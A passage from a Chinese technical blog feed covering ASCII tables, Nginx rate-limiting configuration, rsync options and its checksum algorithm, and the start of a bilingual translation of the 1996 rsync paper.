align="center">01010100</td><td align="center">84</td><td align="center">0x54</td><td align="center">T</td><td align="center">01110100</td><td align="center">116</td><td align="center">0x74</td><td align="center">t</td></tr><tr><td align="center">00110101</td><td align="center">53</td><td align="center">0x35</td><td align="center">5</td><td align="center">01010101</td><td align="center">85</td><td align="center">0x55</td><td align="center">U</td><td align="center">01110101</td><td align="center">117</td><td align="center">0x75</td><td align="center">u</td></tr><tr><td align="center">00110110</td><td align="center">54</td><td align="center">0x36</td><td align="center">6</td><td align="center">01010110</td><td align="center">86</td><td align="center">0x56</td><td align="center">V</td><td align="center">01110110</td><td align="center">118</td><td align="center">0x76</td><td align="center">v</td></tr><tr><td align="center">00110111</td><td align="center">55</td><td align="center">0x37</td><td align="center">7</td><td align="center">01010111</td><td align="center">87</td><td align="center">0x57</td><td align="center">W</td><td align="center">01110111</td><td align="center">119</td><td align="center">77</td><td align="center">w</td></tr><tr><td align="center">00111000</td><td align="center">56</td><td align="center">0x38</td><td align="center">8</td><td align="center">01011000</td><td align="center">88</td><td align="center">0x58</td><td align="center">X</td><td align="center">01111000</td><td align="center">120</td><td align="center">0x78</td><td align="center">x</td></tr><tr><td align="center">00111001</td><td align="center">57</td><td align="center">0x39</td><td align="center">9</td><td align="center">01011001</td><td align="center">89</td><td align="center">0x59</td><td align="center">Y</td><td align="center">01111001</td><td align="center">121</td><td align="center">0x79</td><td align="center">y</td></tr><tr><td align="center">00111010</td><td align="center">58</td><td align="center">0x3A</td><td align="center">:</td><td align="center">01011010</td><td align="center">90</td><td align="center">0x5A</td><td align="center">Z</td><td align="center">01111010</td><td align="center">122</td><td align="center">0x7A</td><td align="center">z</td></tr><tr><td align="center">00111011</td><td align="center">59</td><td align="center">0x3B</td><td align="center">;</td><td align="center">01011011</td><td align="center">91</td><td align="center">0x5B</td><td align="center">[</td><td align="center">01111011</td><td align="center">123</td><td align="center">0x7B</td><td align="center">{</td></tr><tr><td align="center">00111100</td><td align="center">60</td><td align="center">0x3C</td><td align="center">&lt;</td><td align="center">01011100</td><td align="center">92</td><td align="center">0x5C</td><td align="center">\</td><td align="center">01111100</td><td align="center">124</td><td align="center">0x7C</td><td align="center">|</td></tr><tr><td align="center">00111101</td><td align="center">61</td><td align="center">0x3D</td><td align="center">&#x3D;</td><td align="center">01011101</td><td align="center">93</td><td align="center">0x5D</td><td align="center">]</td><td align="center">01111101</td><td align="center">125</td><td align="center">0x7D</td><td align="center">}</td></tr><tr><td align="center">00111110</td><td align="center">62</td><td align="center">0x3E</td><td align="center">&gt;</td><td align="center">01011110</td><td align="center">94</td><td align="center">0x5E</td><td align="center">^</td><td align="center">01111110</td><td align="center">126</td><td align="center">0x7E</td><td align="center">~</td></tr><tr><td align="center">00111111</td><td align="center">63</td><td align="center">0x3F</td><td align="center">?</td><td align="center">01011111</td><td align="center">95</td><td align="center">0x5F</td><td align="center">_</td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td></tr></tbody></table><h3 id="9-2、ASCII控制字符"><a href="#9-2、ASCII控制字符" class="headerlink" title="9.2、ASCII控制字符"></a>9.2、ASCII控制字符</h3><table><thead><tr><th align="center">二进制</th><th align="center">十进制</th><th align="center">十六进制</th><th align="center">缩写</th><th align="center">名称&#x2F;意义</th></tr></thead><tbody><tr><td align="center">0000 0000</td><td align="center">0</td><td align="center">0x0</td><td align="center">NUL</td><td align="center">空字符（Null）</td></tr><tr><td align="center">0000 0001</td><td align="center">1</td><td align="center">0x1</td><td align="center">SOH</td><td align="center">标题开始</td></tr><tr><td align="center">0000 0010</td><td align="center">2</td><td align="center">0x2</td><td align="center">STX</td><td align="center">本文开始</td></tr><tr><td align="center">0000 0011</td><td align="center">3</td><td align="center">0x3</td><td align="center">ETX</td><td align="center">本文结束</td></tr><tr><td align="center">0000 0100</td><td align="center">4</td><td align="center">0x4</td><td align="center">EOT</td><td align="center">传输结束</td></tr><tr><td align="center">0000 0101</td><td align="center">5</td><td align="center">0x5</td><td align="center">ENQ</td><td align="center">请求</td></tr><tr><td align="center">0000 0110</td><td align="center">6</td><td align="center">0x6</td><td align="center">ACK</td><td align="center">确认回应</td></tr><tr><td align="center">0000 0111</td><td align="center">7</td><td align="center">0x7</td><td align="center">BEL</td><td align="center">响铃</td></tr><tr><td align="center">0000 1000</td><td align="center">8</td><td align="center">0x8</td><td align="center">BS</td><td align="center">退格</td></tr><tr><td align="center">0000 1001</td><td align="center">9</td><td align="center">0x9</td><td align="center">HT</td><td align="center">水平定位符号</td></tr><tr><td align="center">0000 1010</td><td align="center">10</td><td align="center">0x0A</td><td align="center">LF</td><td align="center">换行键</td></tr><tr><td align="center">0000 1011</td><td align="center">11</td><td align="center">0x0B</td><td align="center">VT</td><td align="center">垂直定位符号</td></tr><tr><td align="center">0000 1100</td><td align="center">12</td><td align="center">0x0C</td><td align="center">FF</td><td align="center">换页键</td></tr><tr><td align="center">0000 1101</td><td align="center">13</td><td align="center">0x0D</td><td align="center">CR</td><td align="center">归位键</td></tr><tr><td align="center">0000 1110</td><td align="center">14</td><td align="center">0x0E</td><td align="center">SO</td><td align="center">取消变换（Shift out）</td></tr><tr><td align="center">0000 1111</td><td align="center">15</td><td align="center">0x0F</td><td align="center">SI</td><td align="center">启用变换（Shift in）</td></tr><tr><td align="center">0001 0000</td><td align="center">16</td><td align="center">0x10</td><td align="center">DLE</td><td align="center">跳出数据通讯</td></tr><tr><td align="center">0001 0001</td><td align="center">17</td><td align="center">0x11</td><td align="center">DC1</td><td align="center">设备控制一（XON 启用软件速度控制）</td></tr><tr><td align="center">0001 0010</td><td align="center">18</td><td align="center">0x12</td><td align="center">DC2</td><td align="center">设备控制二</td></tr><tr><td align="center">0001 0011</td><td align="center">19</td><td align="center">0x13</td><td align="center">DC3</td><td align="center">设备控制三（XOFF 停用软件速度控制）</td></tr><tr><td align="center">0001 0100</td><td align="center">20</td><td align="center">0x14</td><td align="center">DC4</td><td align="center">设备控制四</td></tr><tr><td align="center">0001 0101</td><td align="center">21</td><td align="center">0x15</td><td align="center">NAK</td><td align="center">确认失败回应</td></tr><tr><td align="center">0001 0110</td><td align="center">22</td><td align="center">0x16</td><td align="center">SYN</td><td align="center">同步用暂停</td></tr><tr><td align="center">0001 0111</td><td align="center">23</td><td align="center">0x17</td><td align="center">ETB</td><td align="center">区块传输结束</td></tr><tr><td align="center">0001 1000</td><td align="center">24</td><td align="center">0x18</td><td align="center">CAN</td><td align="center">取消</td></tr><tr><td align="center">0001 1001</td><td align="center">25</td><td align="center">0x19</td><td align="center">EM</td><td align="center">连接介质中断</td></tr><tr><td align="center">0001 1010</td><td align="center">26</td><td align="center">0x1A</td><td align="center">SUB</td><td align="center">替换</td></tr><tr><td align="center">0001 1011</td><td align="center">27</td><td align="center">0x1B</td><td align="center">ESC</td><td align="center">跳出</td></tr><tr><td align="center">0001 1100</td><td align="center">28</td><td align="center">0x1C</td><td align="center">FS</td><td align="center">文件分割符</td></tr><tr><td align="center">0001 1101</td><td align="center">29</td><td align="center">0x1D</td><td align="center">GS</td><td align="center">组群分隔符</td></tr><tr><td align="center">0001 1110</td><td align="center">30</td><td align="center">0x1E</td><td align="center">RS</td><td align="center">记录分隔符</td></tr><tr><td align="center">0001 1111</td><td align="center">31</td><td align="center">0x1F</td><td align="center">US</td><td align="center">单元分隔符</td></tr><tr><td align="center">0111 1111</td><td align="center">127</td><td align="center">0x7F</td><td align="center">DEL</td><td align="center">删除</td></tr></tbody></table><h2 id="十、在线编码网站"><a href="#十、在线编码网站" class="headerlink" title="十、在线编码网站"></a>十、在线编码网站</h2><ul><li><p><a href="https://www.qtool.net/baseencode">Base编码转换</a>：支持Base16、32、36、58、62、64、85、91等类型的编解码；</p></li><li><p><a href="http://extraconversion.com/base-number/base-36">Conversion Tool</a>：支持超多种的Base类型的编解码转换；</p></li><li><p><a href="http://www.gongjumi.com/Encode/Ascii85Base85">Base85编解码</a>、<a href="http://www.gongjumi.com/Encode/Base64">Base64编解码</a>；</p></li><li><p><a href="https://www.dcode.fr/base-91-encoding">Base91-Encoding</a>；</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Base编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ngxin的限流方式</title>
      <link href="/2019/10/30/nginx-current-limiting/"/>
      <url>/2019/10/30/nginx-current-limiting/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p><a href="https://nginx.org/en/">Nginx</a>的限流的实现，可以保证高并发场景下的服务的可用性，控制网络以及CPU&#x2F;内存负载，极端场景下还可以减小暴力破解对系统的危害性。Nginx本身自带了几个限流模块 ：</p><ul><li><p>对客户端的限流模块：</p><ul><li><a href="http://nginx.org/en/docs/http/ngx_http_limit_conn_module.html">ngx_http_limit_conn_module</a>：按照连接数限流，限制单个IP的并发连接数；</li><li><a href="http://nginx.org/en/docs/http/ngx_http_limit_req_module.html">ngx_http_limit_req_module</a>：按照请求速率限流，使用漏桶的方式限制请求的处理速率；</li></ul></li><li><p>对服务端的限流模块：</p><ul><li><a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html">ngx_http_upstream_module</a>：用于定义可以由<code>proxy_pass</code>， <code>fastcgi_pass</code>， <code>uwsgi_pass</code>， <code>scgi_pass</code>， <code>memcached_pass</code>和 <code>grpc_pass</code>指令引用的服务器组；</li></ul></li></ul><h2 id="二、限流模块"><a href="#二、限流模块" class="headerlink" title="二、限流模块"></a>二、限流模块</h2><h3 id="2-1、ngx-http-limit-conn-module"><a href="#2-1、ngx-http-limit-conn-module" class="headerlink" title="2.1、ngx_http_limit_conn_module"></a>2.1、ngx_http_limit_conn_module</h3><p>用于设置单IP最大允许的连接数，当超过该连接数，服务器将返回错误信息（默认错误码为<code>503</code>）。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">http &#123;<br>    limit_conn_zone <span class="hljs-variable">$binary_remote_addr</span> zone=one:10m;<br>    ...<br>    server &#123;<br>        ...<br>        location /download/ &#123;<br>            limit_conn one 10;<br>        &#125;<br>        ...<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>limit_conn_zone</code>：</p><ul><li>语法：<code>limit_conn_zone key zone=name:size;</code></li><li>示例解释：设置共享内存的大小，用于存储各Client的状态，其中<code>zone</code>配置对应的值可以自定义；</li><li>配置位置：可配置于<code>http</code>中；</li></ul></li><li><p><code>limit_conn</code>：</p><ul><li>语法：<code>limit_conn zone number;</code></li><li>示例解释：访问<code>/download/</code>地址的IP可以允许同时存在<code>10</code>个连接，其中<code>one</code>可以为其他值，需要保持与<code>limit_conn_zone</code>配置中的<code>zone</code>后的信息对应；</li><li>配置位置：可配置于<code>http</code>、<code>server</code>、<code>location</code>中；</li></ul></li><li><p>更多参数请参考<code>ngx_http_limit_conn_module</code>模块的<a href="http://nginx.org/en/docs/http/ngx_http_limit_conn_module.html">官方文档</a>；</p></li></ul><h3 id="2-2、ngx-http-limit-req-module"><a href="#2-2、ngx-http-limit-req-module" class="headerlink" title="2.2、ngx_http_limit_req_module"></a>2.2、ngx_http_limit_req_module</h3><p>使用令牌桶的方式限制每个Client的请求处理速率，如果请求的速率超过限制则会被延迟处理，当数量超过突发值时会返回错误信息（默认错误码为<code>503</code>）。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">http &#123;<br>    limit_req_zone <span class="hljs-variable">$binary_remote_addr</span> zone=one:10m rate=1r/s;<br>    ...<br>    server &#123;<br>        ...<br>        location /search/ &#123;<br>            limit_req zone=one burst=5;<br>        &#125;<br>        ...<br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p><code>limit_req_zone</code>：</p><ul><li>语法：<code>limit_req_zone key zone=name:size rate=rate[sync];</code></li><li>示例解释：分配<code>10m</code>大小的共享内存存储客户端的状态，每个地址每秒只能请求<code>1</code>次；</li><li>配置位置：可配置于<code>http</code>中；</li></ul></li><li><p><code>limit_req</code>：</p><ul><li>语法：<code>limit_req zone=name [burst=number] [nodelay | delay=number]</code>；</li><li>示例解释：令牌桶一共有<code>5</code>块令牌，并且每秒钟只新增<code>1</code>块令牌，5块令牌发完后，多出来的请求就会返回<code>503</code>；</li><li>配置位置：可配置于<code>http</code>、<code>server</code>、<code>location</code>中；</li></ul></li><li><p>更多参数请参考<code>ngx_http_limit_req_module</code>模块的<a href="http://nginx.org/en/docs/http/ngx_http_limit_req_module.html">官方文档</a>；</p></li></ul><h3 id="2-3、ngx-http-upstream-module"><a href="#2-3、ngx-http-upstream-module" class="headerlink" title="2.3、ngx_http_upstream_module"></a>2.3、ngx_http_upstream_module</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">upstream backend &#123;<br>    server backend1.example1.com:8083 max_conns=10;<br>    server backend2.example2.com:8084 max_conns=10;<br>&#125;<br><br>server &#123;<br>    location / &#123;<br>        proxy_pass http://backend;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>max_conns：从1.5.9版本后开支持该参数（商业版本中），从1.11.5版本之后非商业版本也可以使用；</p><ul><li>语法：<code>max_conns=number</code></li><li>示例解释：限制连接后端服务器的最大连接数为<code>10</code>；</li><li>配置位置：可配置于<code>upstream</code>中；</li></ul></li><li><p>更多参数请参考<code>ngx_http_upstream_module</code>模块的<a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html">官方文档</a>；</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 限流 </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsync指令的使用与算法解析 - 每周指令</title>
      <link href="/2019/10/20/command-rsync/"/>
      <url>/2019/10/20/command-rsync/</url>
      
        <content type="html"><![CDATA[<p><a href="https://rsync.samba.org/">rsync</a>命令是一个远程数据同步工具，可通过<code>LAN/WAN</code>快速同步多台主机间的文件。rsync使用所谓的<code>rsync算法</code>来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 <code>rsync</code>是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。</p><h2 id="一、参数解析"><a href="#一、参数解析" class="headerlink" title="一、参数解析"></a>一、参数解析</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">-v, --verbose 详细模式输出。<br>-q, --quiet 精简输出模式。<br>-c, --checksum 打开校验开关，强制对文件传输进行校验。<br>-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。<br>-r, --recursive 对子目录以递归模式处理。<br>-R, --relative 使用相对路径信息。<br>-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。<br>--backup-dir 将备份文件(如~filename)存放在在目录下。<br>-suffix=SUFFIX 定义备份文件前缀。<br>-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。<br>-l, --links 保留软链结。<br>-L, --copy-links 想对待常规文件一样处理软链结。<br>--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。<br>--safe-links 忽略指向SRC路径目录树以外的链结。<br>-H, --hard-links 保留硬链结。<br>-p, --perms 保持文件权限。<br>-o, --owner 保持文件属主信息。<br>-g, --group 保持文件属组信息。<br>-D, --devices 保持设备文件信息。<br>-t, --<span class="hljs-built_in">times</span> 保持文件时间信息。<br>-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。<br>-n, --dry-run现实哪些文件将被传输。<br>-w, --whole-file 拷贝文件，不进行增量检测。<br>-x, --one-file-system 不要跨越文件系统边界。<br>-B, --block-size=SIZE 检验算法使用的块尺寸，默认是700字节。<br>-e, --rsh=<span class="hljs-built_in">command</span> 指定使用rsh、ssh方式进行数据同步。<br>--rsync-path=PATH 指定远程服务器上的rsync命令所在路径信息。<br>-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。<br>--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。<br>--delete 删除那些DST中SRC没有的文件。<br>--delete-excluded 同样删除接收端那些被该选项指定排除的文件。<br>--delete-after 传输结束以后再删除。<br>--ignore-errors 及时出现IO错误也进行删除。<br>--max-delete=NUM 最多删除NUM个文件。<br>--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。<br>--force 强制删除目录，即使不为空。<br>--numeric-ids 不将数字的用户和组<span class="hljs-built_in">id</span>匹配为用户名和组名。<br>--<span class="hljs-built_in">timeout</span>=<span class="hljs-keyword">time</span> ip超时时间，单位为秒。<br>-I, --ignore-times 不跳过那些有同样的时间和长度的文件。<br>--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。<br>--modify-window=NUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。<br>-T --temp-dir=DIR 在DIR中创建临时文件。<br>--compare-dest=DIR 同样比较DIR中的文件来决定是否需要备份。<br>-P 等同于 --partial。<br>--progress 显示备份过程。<br>-z, --compress 对备份的文件在传输时进行压缩处理。<br>--exclude=PATTERN 指定排除不需要传输的文件模式。<br>--include=PATTERN 指定不排除而需要传输的文件模式。<br>--exclude-from=FILE 排除FILE中指定模式的文件。<br>--include-from=FILE 不排除FILE指定模式匹配的文件。<br>--version 打印版本信息。<br>--address 绑定到特定的地址。<br>--config=FILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。<br>--port=PORT 指定其他的rsync服务端口。<br>--blocking-io 对远程shell使用阻塞IO。<br>-stats 给出某些文件的传输状态。<br>--progress 在传输时现实传输过程。<br>--log-format=formAT 指定日志文件格式。<br>--password-file=FILE 从FILE中得到密码，格式为文件中单行写入密码<br>--bwlimit=KBPS 限制I/O带宽，KBytes per second。<br>-h, --<span class="hljs-built_in">help</span> 显示帮助信息。<br></code></pre></td></tr></table></figure><h2 id="二、工作模式"><a href="#二、工作模式" class="headerlink" title="二、工作模式"></a>二、工作模式</h2><p><code>rsync</code>有<code>六种</code>不同的工作模式，详细介绍如下：</p><ul><li><p><strong>拷贝本地文件</strong>：</p><ul><li><code>规则</code>：当<code>SRC</code>和<code>DES</code>路径信息都不包含有单个冒号<code>:</code>分隔符时就启动该模式；</li><li><code>语法</code>：<code>rsync [OPTION]... SRC DEST</code>；</li><li><code>示例``：</code>rsync -a &#x2F;data &#x2F;backup&#96;；</li></ul></li><li><p><strong>将本地机器的内容拷贝到远程机器</strong>：</p><ul><li><code>规则</code>：当<code>DST</code>路径地址包含单个冒号<code>:</code>分隔符时启动该模式；</li><li><code>语法</code>：<code>rsync [OPTION]... SRC [USER@]host:DEST</code>；</li><li><code>示例</code>：<code>rsync -avz *.c foo:src</code></li></ul></li><li><p><strong>将远程机器的内容拷贝到本地机器</strong>：</p><ul><li><code>规则</code>：当<code>SRC</code>地址路径包含单个冒号<code>:</code>分隔符时启动该模式；</li><li><code>语法</code>：<code>rsync [OPTION]... [USER@]HOST:SRC DEST</code>；</li><li><code>示例</code>：<code>rsync -avz foo:src/bar /data</code>；</li></ul></li><li><p><strong>从远程<code>rsync</code>服务器中拷贝文件到本地机</strong>：</p><ul><li><code>规则</code>：当<code>SRC</code>路径信息包含<code>::</code>分隔符时启动该模式；</li><li><code>语法</code>：<code>rsync [OPTION]... [USER@]HOST::SRC DEST</code>；</li><li><code>示例</code>：<code>rsync -av root@192.168.78.192::www /databack</code>；</li></ul></li><li><p><strong>从本地机器拷贝文件到远程<code>rsync</code>服务器</strong>：</p><ul><li><code>规则</code>：当<code>DST</code>路径信息包含<code>::</code>分隔符时启动该模式；</li><li><code>语法</code>：<code>rsync [OPTION]... SRC [USER@]HOST::DEST</code>；</li><li><code>示例</code>：<code>rsync -av /databack root@192.168.78.192::www</code>；</li></ul></li><li><p><strong>列出远程机的文件列表</strong>：</p><ul><li><code>规则</code>：命令中省略掉本地机信息；</li><li><code>语法</code>：<code>rsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]</code>；</li><li><code>示例</code>：<code>rsync -v rsync://192.168.78.192/www</code>；</li></ul></li></ul><h2 id="三、rsync的算法解析"><a href="#三、rsync的算法解析" class="headerlink" title="三、rsync的算法解析"></a>三、rsync的算法解析</h2><h3 id="3-1、分块checksum算法"><a href="#3-1、分块checksum算法" class="headerlink" title="3.1、分块checksum算法"></a>3.1、分块checksum算法</h3><p>首先，我们会把 <code>DST文件 </code>的文件均切分成若干小块，例如每块大小为512个字节（最后一块会小于这个数），然后对每块计算两个<code>checksum</code>，计算checksum使用的算法如下：</p><ul><li><code>rolling checksum（轮替校验和）</code>：这是一种弱checksum，会产生32位的checksum，使用的是Mark Adler发明的<a href="http://en.wikipedia.org/wiki/Adler-32">adler-32算法</a>，用来快速弱检验是否相同；</li><li><code>强checksum</code>：会产生128位的checksum，之前使用的是md4，现在使用的md5 hash算法，用来精准校验是否相同；</li></ul><p><img src="/assets/images/rsync-checksum.png" alt="checksum校验" loading="lazy"></p><h3 id="3-2、传输算法"><a href="#3-2、传输算法" class="headerlink" title="3.2、传输算法"></a>3.2、传输算法</h3><p>同步目标端会把<code>DST文件</code>的的一个<code>checksum列表</code>传给同步源，这个列表里包括了三个东西：</p><ul><li>rolling checksum(32bits)</li><li>md5 checksum(128bits)</li><li>文件块编号</li></ul><h3 id="3-3、checksum查找算法"><a href="#3-3、checksum查找算法" class="headerlink" title="3.3、checksum查找算法"></a>3.3、checksum查找算法</h3><p>同步源端拿到<code>DST文件</code>的<code>checksum数组</code>后，会把这个数据存到一个<code>hash table</code>中，用<code>rolling checksum</code>做<code>hash</code>，以便获得<code>O(1)</code>时间复杂度的查找性能，<code>hash表</code>大小为<code>16bits</code>的，因此<code>hash表</code>槽位为<code>2的16次方</code>，同时使用链表来解决碰撞冲突。</p><p><img src="/assets/images/rsync-dst-checksum-hash-table.png" alt="DST文件块checksum组成的hash表" loading="lazy"></p><h3 id="3-4、比对算法"><a href="#3-4、比对算法" class="headerlink" title="3.4、比对算法"></a>3.4、比对算法</h3><ul><li>取<code>SRC文件</code>的<code>第一个</code>文件块（假设文件块大小为<code>512</code>），也就是从<code>SRC文件</code>的第1个字节到第512个字节，取出来后做<code>rolling checksum</code>计算，在<code>hash表</code>中查找计算好的值：<ul><li><code>找到对应的checksum</code>：<ul><li>由于<code>rolling checksum</code>是一个弱checksum，因为尝试比较<code>md5</code>的<code>checksum</code>，经过两次的<code>checksum</code>比较，最终仍旧发生冲突的概率为<code>1/(2^160)</code>，这种冲突概率太小，忽略不计；</li><li>在比较<code>md5</code>的<code>checksum</code>后，如果可以找到对应的匹配项，则表示在<code>SRC文件</code>和<code>DST文件</code>中有相同的文件块；</li></ul></li><li><code>未找到对应的checksum</code>：只要<code>rolling checksum</code> 或 <code>md5 checksum</code> 其中有一个在<code>DST文件</code>的<code>checksum hash表</code>中找不到匹配项，那么就会触发算法对<code>SRC文件</code>的<code>rolling</code>动作，比对算法会住后移动<code>1个字节</code>，对<code>SRC文件</code>的字节位置为<code>2-513</code>的文件块要做<code>checksum</code>  (需要特别注意：<strong>这里在原有<code>checksum</code>的基础上进行调整就可以得出新的<code>checksum</code>，而不必重新计算<code>checksum</code>，这也是<code>rolling</code>的精髓</strong>)；</li></ul></li></ul><p><img src="/assets/images/rsync-chunk-comparison.png" alt="数据比对" loading="lazy"></p><p>最终，在同步源这端，我们的rsync算法可能会得到下面这个样子的一个数据数组，图中，红色块表示在目标端已匹配上，不用传输（注：<strong>图中存在两块<code>Chunk #5</code>指的是两个文件块在计算<code>checksum</code>的时候存在<code>hash冲突</code>，使用了链表进行解决</strong>），而白色的地方就是需要传输的内容（注意：这些白色的块是不定长的），这样，同步源这端把这个数组（白色的就是实际内容，红色的就放一个标号）压缩传到目的端，在目的端的rsync会根据这个表重新生成文件，这样，同步完成。</p><p><img src="/assets/images/rsync-after-data-comparison.png" alt="数据比对后" loading="lazy"></p><h3 id="3-5、补充文档"><a href="#3-5、补充文档" class="headerlink" title="3.5、补充文档"></a>3.5、补充文档</h3><ul><li><a href="https://www.samba.org/~tridge/phd_thesis.pdf">Andrew Tridgell 关于排序和同步算法的博士论文</a></li><li><a href="https://rsync.samba.org/tech_report/">rsync算法官方介绍</a></li></ul><p>参考文档：<a href="https://coolshell.cn/articles/7425.html">https://coolshell.cn/articles/7425.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 常用命令 </tag>
            
            <tag> rsync </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>译 - The rsync algorithm</title>
      <link href="/2019/10/20/the-rsync-algorithm/"/>
      <url>/2019/10/20/the-rsync-algorithm/</url>
      
        <content type="html"><![CDATA[<div><p><a href="https://www.andrew.cmu.edu/course/15-749/READINGS/required/cas/tridgell96.pdf">《The rsync algorithm》</a>这篇发表于 1996 年的论文中介绍了一种名为 rsync 的增量同步算法，它能够快速地将两个文件夹中的内容同步。该算法利用了文件的局部性和差异性，通过计算文件的弱校验和和块校验和来确定文件的相似性，并进行增量同步。该算法具有高效性、可靠性和安全性等优点，在实际应用中被广泛使用。</p></div><h2 id="0、摘要"><a href="#0、摘要" class="headerlink" title="0、摘要"></a>0、摘要</h2><p>This report presents an algorithm for updating a file on one machine to be identical to a file on another machine. We assume that the two machines are connected by a low-bandwidth high-latency bi-directional communications link. The algorithm identifies parts of the source file which are identical to some part of the destination file, and only sends those parts which cannot be matched in this way. Effectively, the algorithm computes a set of differences without having both files on the same machine. The algorithm works best when the files are similar, but will also function correctly and reasonably efficiently when the files are quite different.</p><p>该报告中提出了一种算法，用于更新一台机器上的文件使其与另一台机器上的文件相同。 我们假设两台机器之间通过低带宽、高延迟的网络进行双向连接。 该算法能够识别出源文件与目标文件中相同的部分，并且只发送那些不一致的部分。 实际上，该算法可以计算出一个差异的数据集，而无需两个文件在同一个机器上。该算法在文件相似的情况下效果很好，在文件完全不同的情况下，它也能正确并合理的高效工作。</p><h2 id="1、问题"><a href="#1、问题" class="headerlink" title="1、问题"></a>1、问题</h2><p>Imagine you have two files, A and B, and you wish to update B to be the same as A. The obvious method is to copy A onto B.</p><p>假设您有两个文件，A 和 B，您希望将 B 的内容更新的和 A 一样。很明显最简单（显而易见）的方法是将 A 复制到 B。</p><p>Now imagine that the two files are on machines connected by a slow com- munications link, for example a dial up IP link. If A is large, copying A onto B will be slow. To make it faster you could compress A before sending it, but that will usually only gain a factor of 2 to 4.</p><p>现在假设这两个文件之间的通信链路十分缓慢，例如使用一个拨号上网的路由器。 如果 A 文件很大，那么将 A 文件复制到 B 的过程会十分缓慢。 为了使其速度更快，我们可以在发送之前压缩 A，但这通常只会增加 2 到 4 倍的传输效率。</p><p>Now assume that A and B are quite similar, perhaps both derived from the same original file. To really speed things up you would need to take advantage of this similarity. A common method is to send just the differences between A and B down the link and then use this list of differences to reconstruct the file.</p><p>现在假设 A 和 B 非常相似，可能都来自于同一个原始文件。 要想真正的提高传输速度，我们可以利用这种相似性。 一种常见的方法是仅传输 A 和 B 之间的差异，然后使用此差异列表来重建文件。</p><p>The problem is that the normal methods for creating a set of differences between two files rely on being able to read both files. Thus they require that both files are available beforehand at one end of the link. If they are not both available on the same machine, these algorithms cannot be used (once you had copied the file over, you wouldn’t need the differences). This is the problem that rsync addresses.</p><p>问题在于创建两个文件差异数据集的常规方法需要能够读取这两个文件。 因此，它们要求在传输开始前这两个文件在链接一端是存在的。如果这两个文件在同一个机器上不存在，则无法使用这些算法（一旦将文件复制过来，就不需要差异信息了）。这就是 rsync 解决的问题。</p><p>The rsync algorithm efficiently computes which parts of a source file match some part of an existing destination file. These parts need not be sent across the link; all that is needed is a reference to the part of the destination file. Only parts of the source file which are not matched in this way need to be sent verbatim. The receiver can then construct a copy of the source file using the references to parts of the existing destination file and the verbatim material.</p><p>rsync 算法能够高效地计算源文件与目标文件中匹配的部分。 这部分数据不需要通过链接发送；所需要的只是引用目标文件的部分数据。 只需要发送源文件中不匹配的分布数据。然后，接收者可以使用对现有目标文件部分内容的引用和逐字记录的材料（传输的差异数据）来构建源文件的副本。</p><p>Trivially, the data sent to the receiver can be compressed using any of a range of common compression algorithms, for further speed improvements.</p><p>通常，可以使用众多常用压缩算法中的任何一种来压缩待发送到接收器的数据，来进一步提高速度。</p><h2 id="2、rsync算法"><a href="#2、rsync算法" class="headerlink" title="2、rsync算法"></a>2、rsync算法</h2><p>Suppose we have two general purpose computers a and b. Computer a has access to a file A and b has access to file B, where A and B are “similar”. There is a slow communications link between a and b.</p><p>假设我们有两台通用计算机 a 和 b。 计算机 a 可以访问文件 A，b 可以访问文件 B，其中 A 和 B 是 “相似的” 。 a 和 b 之间的通信链路很慢。</p><p>The rsync algorithm consists of the following steps:</p><p>rsync算法包括以下步骤：</p><ol><li>b splits the file B into a series of non-overlapping fixed-sized blocks of size S bytes [1] . The last block may be shorter than S bytes.</li><li>For each of these blocks b calculates two checksums: a weak “rolling” 32-bit checksum (described below) and a strong 128-bit MD4 checksum.</li><li>b sends these checksums to a.</li><li>a searches through A to find all blocks of length S bytes (at any offset, not just multiples of S) that have the same weak and strong checksum as one of the blocks of B. This can be done in a single pass very quickly using a special property of the rolling checksum described below.</li><li>a sends b a sequence of instructions for constructing a copy of A. Each instruction is either a reference to a block of B, or literal data. Literal data is sent only for those sections of A which did not match any of the blocks of B.</li></ol><br /><ol><li>b 将文件 B 拆分为一系列大小为 S 字节 [1] 的非重叠的固定大小的块。 最后一个块的大小可能小于 S 字节。</li><li>对于这些块中的每一个，b 会计算两个校验和：弱 “滚动” 32 位校验和（如下所述）和强 128 位 MD4 校验和。</li><li>b 将这些校验和发送给 a。</li><li>a 搜索 A 以找到所有长度为 S 